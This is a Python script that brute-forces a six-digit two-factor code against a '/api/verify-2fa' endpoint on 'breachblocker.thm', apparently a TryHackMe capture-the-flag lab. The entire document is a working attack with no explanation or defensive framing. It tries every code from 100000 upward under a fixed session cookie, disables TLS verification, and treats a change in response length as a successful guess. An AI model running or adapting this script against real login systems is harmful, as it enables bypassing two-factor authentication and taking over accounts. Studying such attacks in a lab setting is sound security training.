import requests
import urllib3

urllib3.disable_warnings()

URL = "https://breachblocker.thm:8443/api/verify-2fa"

SESSION = "HopsecBank_SESSION"

HEADERS = {
    "Content-Type": "application/json",
    "Cookie": f"session={SESSION}",
    "Connection": "close"
}

for i in range(100000, 1000000):
    otp = f"{i:06d}"

    r = requests.post(
        URL,
        headers=HEADERS,
        data=f'{{"code":"{otp}"}}',
        verify=False,
        allow_redirects=False,
        timeout=3
    )

    if "No 2FA code generated" in r.text:
        print("[!] SESSION LOST – OTP DELETED")
        print("Response:", r.text)
        break

    if len(r.text) != 25:
        print("[+] OTP FOUND:", otp)
        print("Status:", r.status_code)
        print("Response:", r.text)
        break
